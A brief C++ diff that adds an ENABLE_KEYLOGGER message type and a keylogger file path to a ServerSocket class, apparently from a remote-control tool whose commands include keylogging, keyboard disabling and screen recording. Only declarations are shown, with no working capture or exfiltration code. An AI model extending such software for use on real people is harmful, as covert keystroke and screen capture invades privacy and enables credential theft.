@@ -41,6 +41,7 @@ enum MessageType {
     DISABLE_KEYBOARD,
     ENABLE_KEYBOARD,
     DISABLE_KEYLOGGER,
+    ENABLE_KEYLOGGER,
     KEY_LOGGER,
     SCREEN_RECORDING
 };
@@ -66,11 +67,7 @@ private:
 
     std::string response;
 
-    std::atomic<bool> isKeyboardDisabled;
-    
-    std::thread keyboardThread;
-
-    std::thread keyloggerThread;
+    std::string keyloggerFilePath;
 
 public:
     ServerSocket();
